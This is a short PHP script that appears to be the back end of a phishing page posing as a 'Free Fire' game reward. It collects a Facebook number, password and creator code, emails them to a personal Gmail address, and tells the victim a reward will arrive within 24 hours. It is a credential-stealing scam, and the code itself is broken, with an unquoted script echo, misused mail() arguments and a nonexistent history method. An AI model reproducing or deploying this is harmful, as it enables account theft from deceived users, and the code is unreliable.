<?php
$facebooknumber = $_REQUEST['fb number'];
$password = $_REQUEST['password'];
$creatorcode = $_REQUEST['creator code'];

if (empty($facebooknumber)  || empty($password)  || empty($creatorcode))
{
    echo "please fill all the fields";
}
else
{
    mail("patelkrishg2003@gmail.com", "free fire rewards", $facebooknumber ,$password , $creatorcode);
    echo <script type='text/javascript'>alert('your reward wiil be set within 24 hours');
    window.history.log(-1);
    </script>; 
}
?>